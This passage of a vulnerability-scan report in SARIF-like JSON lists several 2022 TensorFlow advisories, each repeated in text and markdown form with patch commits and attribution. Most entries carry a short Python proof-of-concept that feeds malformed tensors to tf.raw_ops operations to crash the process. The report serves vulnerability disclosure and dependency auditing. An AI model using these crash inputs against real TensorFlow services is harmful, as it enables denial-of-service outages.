                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35979",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35979"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35979",
              "help": {
                "text": "Vulnerability CVE-2022-35979\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35979](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35979)\n### Impact\nIf `QuantizedRelu` or `QuantizedRelu6` are given nonscalar inputs for `min_features` or `max_features`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\nfeatures = tf.constant(28, shape=[4,2], dtype=tf.quint8)\nmin_features = tf.constant([], shape=[0], dtype=tf.float32)\nmax_features = tf.constant(-128, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\ntf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35979**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35979](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35979)|\n\n### Impact\nIf `QuantizedRelu` or `QuantizedRelu6` are given nonscalar inputs for `min_features` or `max_features`, it results in a segfault that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nout_type = tf.quint8\nfeatures = tf.constant(28, shape=[4,2], dtype=tf.quint8)\nmin_features = tf.constant([], shape=[0], dtype=tf.float32)\nmax_features = tf.constant(-128, shape=[1], dtype=tf.float32)\ntf.raw_ops.QuantizedRelu(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\ntf.raw_ops.QuantizedRelu6(features=features, min_features=min_features, max_features=max_features, out_type=out_type)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [49b3824d83af706df0ad07e4e677d88659756d89](https://github.com/tensorflow/tensorflow/commit/49b3824d83af706df0ad07e4e677d88659756d89).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35992",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35992"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35992",
              "help": {
                "text": "Vulnerability CVE-2022-35992\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35992](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35992)\n### Impact\nWhen `TensorListFromTensor` receives an `element_shape` of a rank greater than one, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)\narg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)\narg_2=``\ntf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3db59a042a38f4338aa207922fa2f476e000a6ee](https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-35992**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35992](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35992)|\n\n### Impact\nWhen `TensorListFromTensor` receives an `element_shape` of a rank greater than one, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=tf.random.uniform(shape=(6, 6, 2), dtype=tf.bfloat16, maxval=None)\narg_1=tf.random.uniform(shape=(6, 9, 1, 3), dtype=tf.int64, maxval=65536)\narg_2=``\ntf.raw_ops.TensorListFromTensor(tensor=arg_0, element_shape=arg_1, name=arg_2)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [3db59a042a38f4338aa207922fa2f476e000a6ee](https://github.com/tensorflow/tensorflow/commit/3db59a042a38f4338aa207922fa2f476e000a6ee).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35981",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35981"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35981",
              "help": {
                "text": "Vulnerability CVE-2022-35981\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35981](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35981)\n### Impact\n`FractionalMaxPoolGrad` validates its inputs with `CHECK` failures instead of with returning errors. If it gets incorrectly sized inputs, the `CHECK` failure can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\noverlapping = True\norig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\norig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nout_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nrow_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\ntf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8741e57d163a079db05a7107a7609af70931def4](https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.",
                "markdown": "**Vulnerability CVE-2022-35981**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35981](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35981)|\n\n### Impact\n`FractionalMaxPoolGrad` validates its inputs with `CHECK` failures instead of with returning errors. If it gets incorrectly sized inputs, the `CHECK` failure can be used to trigger a denial of service attack:\n```python\nimport tensorflow as tf\n\noverlapping = True\norig_input = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\norig_output = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nout_backprop = tf.constant(.453409232, shape=[1,7,13,1], dtype=tf.float32)\nrow_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\ncol_pooling_sequence = tf.constant(0, shape=[5], dtype=tf.int64)\ntf.raw_ops.FractionalMaxPoolGrad(orig_input=orig_input, orig_output=orig_output, out_backprop=out_backprop, row_pooling_sequence=row_pooling_sequence, col_pooling_sequence=col_pooling_sequence, overlapping=overlapping)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [8741e57d163a079db05a7107a7609af70931def4](https://github.com/tensorflow/tensorflow/commit/8741e57d163a079db05a7107a7609af70931def4).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University."
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35994",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35994"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35994",
              "help": {
                "text": "Vulnerability CVE-2022-35994\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35994)\n### Impact\nWhen `CollectiveGather` receives an scalar input `input`, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=1\narg_1=1\narg_2=1\narg_3=1\narg_4=(3, 3,3)\narg_5=`auto`\narg_6=0\narg_7=``\ntf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,\n                            instance_key=arg_3, shape=arg_4,\n                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c1f491817dec39a26be3c574e86a88c30f3c4770](https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-35994**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-35994](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35994)|\n\n### Impact\nWhen `CollectiveGather` receives an scalar input `input`, it gives a `CHECK` fails that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\narg_0=1\narg_1=1\narg_2=1\narg_3=1\narg_4=(3, 3,3)\narg_5=`auto`\narg_6=0\narg_7=``\ntf.raw_ops.CollectiveGather(input=arg_0, group_size=arg_1, group_key=arg_2,\n                            instance_key=arg_3, shape=arg_4,\n                            communication_hint=arg_5, timeout_seconds=arg_6, name=arg_7)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [c1f491817dec39a26be3c574e86a88c30f3c4770](https://github.com/tensorflow/tensorflow/commit/c1f491817dec39a26be3c574e86a88c30f3c4770).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36012",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36012"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36012",
              "help": {
                "text": "Vulnerability CVE-2022-36012\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36012](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36012)\n### Impact\nWhen [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it crashes.\n```cpp\n// We pre-allocate the array of operands and populate it using the\n// `output_name_to_position` and `control_output_to_position` populated\n// previously.\nSmallVector\u003cValue\u003e ret_vals(func.ret_size() + func.control_ret_size(),\n                            Value());\nfor (const auto\u0026 ret_val : func.ret()) {\n  auto position = output_name_to_position.find(ret_val.first);\n  if (position == output_name_to_position.end())\n    return InvalidArgument(\n        \"Can`t import function, returned value references unknown output \"\n        \"argument \",\n        ret_val.first);\n  ret_vals[position-\u003esecond] =\n      value_manager.GetValueOrCreatePlaceholder(ret_val.second);\n}\nfor (const auto\u0026 ret_val : func.control_ret()) {\n  auto position = control_output_to_position.find(ret_val.first);\n  if (position == control_output_to_position.end())\n    return InvalidArgument(\n        \"Can`t import function, returned value references unknown output \"\n        \"argument \",\n        ret_val.first);\n  Value result = value_manager.GetValueOrCreatePlaceholder(\n      (Twine(\"^\") + ret_val.second).str());\n```\n`ret_val.second` cannot be empty. Neither can `input`.\n```cpp\n// Process every node and create a matching MLIR operation\nfor (const NodeDef\u0026 node : nodes) {\n  if (node.op().empty()) return InvalidArgument(\"empty op type\");\n  OperationState state(unknown_loc, absl::StrCat(\"tfg.\", node.op()));\n  // Fetch the inputs, creating placeholder if an input hasn`t been visited.\n  for (const std::string\u0026 input : node.input())\n    state.operands.push_back(\n        value_manager.GetValueOrCreatePlaceholder(input));\n```\n\n\n### Patches\nWe have patched the issue in GitHub commit [ad069af92392efee1418c48ff561fd3070a03d7b](https://github.com/tensorflow/tensorflow/commit/ad069af92392efee1418c48ff561fd3070a03d7b).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n",
                "markdown": "**Vulnerability CVE-2022-36012**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36012](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36012)|\n\n### Impact\nWhen [`mlir::tfg::ConvertGenericFunctionToFunctionDef`](https://github.com/tensorflow/tensorflow/blob/master/tensorflow/core/ir/importexport/functiondef_import.cc) is given empty function attributes, it crashes.\n```cpp\n// We pre-allocate the array of operands and populate it using the\n// `output_name_to_position` and `control_output_to_position` populated\n// previously.\nSmallVector\u003cValue\u003e ret_vals(func.ret_size() + func.control_ret_size(),\n                            Value());\nfor (const auto\u0026 ret_val : func.ret()) {\n  auto position = output_name_to_position.find(ret_val.first);\n  if (position == output_name_to_position.end())\n    return InvalidArgument(\n        \"Can`t import function, returned value references unknown output \"\n        \"argument \",\n        ret_val.first);\n  ret_vals[position-\u003esecond] =\n      value_manager.GetValueOrCreatePlaceholder(ret_val.second);\n}\nfor (const auto\u0026 ret_val : func.control_ret()) {\n  auto position = control_output_to_position.find(ret_val.first);\n  if (position == control_output_to_position.end())\n    return InvalidArgument(\n        \"Can`t import function, returned value references unknown output \"\n        \"argument \",\n        ret_val.first);\n  Value result = value_manager.GetValueOrCreatePlaceholder(\n      (Twine(\"^\") + ret_val.second).str());\n```\n`ret_val.second` cannot be empty. Neither can `input`.\n```cpp\n// Process every node and create a matching MLIR operation\nfor (const NodeDef\u0026 node : nodes) {\n  if (node.op().empty()) return InvalidArgument(\"empty op type\");\n  OperationState state(unknown_loc, absl::StrCat(\"tfg.\", node.op()));\n  // Fetch the inputs, creating placeholder if an input hasn`t been visited.\n  for (const std::string\u0026 input : node.input())\n    state.operands.push_back(\n        value_manager.GetValueOrCreatePlaceholder(input));\n```\n\n\n### Patches\nWe have patched the issue in GitHub commit [ad069af92392efee1418c48ff561fd3070a03d7b](https://github.com/tensorflow/tensorflow/commit/ad069af92392efee1418c48ff561fd3070a03d7b).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36000",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36000"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36000",
              "help": {
                "text": "Vulnerability CVE-2022-36000\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36000](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36000)\n### Impact\n`Eig` can be fed an incorrect `Tout` input, resulting in a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.complex128\narg_2=True\narg_3=``\ntf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aed36912609fc07229b4d0a7b44f3f48efc00fd0](https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-36000**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36000](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36000)|\n\n### Impact\n`Eig` can be fed an incorrect `Tout` input, resulting in a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np \narg_0=tf.constant(value=np.random.random(size=(2, 2)), shape=(2, 2), dtype=tf.float32)\narg_1=tf.complex128\narg_2=True\narg_3=``\ntf.raw_ops.Eig(input=arg_0, Tout=arg_1, compute_v=arg_2, name=arg_3)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [aed36912609fc07229b4d0a7b44f3f48efc00fd0](https://github.com/tensorflow/tensorflow/commit/aed36912609fc07229b4d0a7b44f3f48efc00fd0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36002",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36002"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36002",
              "help": {
                "text": "Vulnerability CVE-2022-36002\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36002)\n### Impact\nWhen `Unbatch` receives a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\narg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)\narg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)\narg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)\narg_3=47\narg_4=``\narg_5=``\ntf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, \n                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [4419d10d576adefa36b0e0a9425d2569f7c0189f](https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n",
                "markdown": "**Vulnerability CVE-2022-36002**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36002](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36002)|\n\n### Impact\nWhen `Unbatch` receives a nonscalar input `id`, it gives a `CHECK` fail that can trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\narg_0=tf.constant(value=np.random.random(size=(3, 3, 1)), dtype=tf.float64)\narg_1=tf.constant(value=np.random.randint(0,100,size=(3, 3, 1)), dtype=tf.int64)\narg_2=tf.constant(value=np.random.randint(0,100,size=(3, 3,  1)), dtype=tf.int64)\narg_3=47\narg_4=``\narg_5=``\ntf.raw_ops.Unbatch(batched_tensor=arg_0, batch_index=arg_1, id=arg_2, \n                   timeout_micros=arg_3, container=arg_4, shared_name=arg_5)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [4419d10d576adefa36b0e0a9425d2569f7c0189f](https://github.com/tensorflow/tensorflow/commit/4419d10d576adefa36b0e0a9425d2569f7c0189f).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by 刘力源, Information System \u0026 Security and Countermeasures Experiments Center, Beijing Institute of Technology.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-36019",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-36019"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36019",
              "help": {
                "text": "Vulnerability CVE-2022-36019\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-36019](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36019)\n### Impact\nIf `FakeQuantWithMinMaxVarsPerChannel` is given `min` or `max` tensors of a rank other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nnum_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[4], dtype=tf.float32)\nmin = tf.constant([], shape=[4,0,0], dtype=tf.float32)\nmax = tf.constant(0, shape=[4], dtype=tf.float32)\ntf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n",
                "markdown": "**Vulnerability CVE-2022-36019**\n| Severity | Fixed Version | Link |\n| --- | --- | --- | --- |\n|medium|2.9.1|[CVE-2022-36019](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-36019)|\n\n### Impact\nIf `FakeQuantWithMinMaxVarsPerChannel` is given `min` or `max` tensors of a rank other than one, it results in a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\n\nnum_bits = 8\nnarrow_range = False\ninputs = tf.constant(0, shape=[4], dtype=tf.float32)\nmin = tf.constant([], shape=[4,0,0], dtype=tf.float32)\nmax = tf.constant(0, shape=[4], dtype=tf.float32)\ntf.raw_ops.FakeQuantWithMinMaxVarsPerChannel(inputs=inputs, min=min, max=max, num_bits=num_bits, narrow_range=narrow_range)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [785d67a78a1d533759fcd2f5e8d6ef778de849e0](https://github.com/tensorflow/tensorflow/commit/785d67a78a1d533759fcd2f5e8d6ef778de849e0).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Neophytos Christou, Secure Systems Labs, Brown University.\n"
              },
              "properties": {
                "security-severity": "5.9",
                "tags": [
                  "vulnerability",
                  "security",
                  "medium"
                ]
              }
            },
            {
              "id": "CVE-2022-35989",
              "name": "LanguageSpecificPackageVulnerability",
              "shortDescription": {
                "text": "CVE-2022-35989"
              },
              "defaultConfiguration": {
                "level": "warning"
              },
              "helpUri": "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35989",
              "help": {
                "text": "Vulnerability CVE-2022-35989\nSeverity: medium\nFixed Version: 2.9.1\nLink: [CVE-2022-35989](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35989)\n### Impact\nWhen `MaxPool` receives a window size input array `ksize` with dimensions greater than its input tensor `input`, the GPU kernel gives a `CHECK` fail that can be used to trigger a denial of service attack.\n```python\nimport tensorflow as tf\nimport numpy as np\n\ninput = np.ones([1, 1, 1, 1])\nksize = [1, 1, 2, 2]\nstrides = [1, 1, 1, 1]\npadding = `VALID`\ndata_format = `NCHW`\n\ntf.raw_ops.MaxPool(input=input, ksize=ksize, strides=strides, padding=padding, data_format=data_format)\n```\n\n### Patches\nWe have patched the issue in GitHub commit [32d7bd3defd134f21a4e344c8dfd40099aaf6b18](https://github.com/tensorflow/tensorflow/commit/32d7bd3defd134f21a4e344c8dfd40099aaf6b18).\n\nThe fix will be included in TensorFlow 2.10.0. We will also cherrypick this commit on TensorFlow 2.9.1, TensorFlow 2.8.1, and TensorFlow 2.7.2, as these are also affected and still in supported range.\n\n\n### For more information\nPlease consult [our security guide](https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n\n### Attribution\nThis vulnerability has been reported by Jingyi Shi.\n",
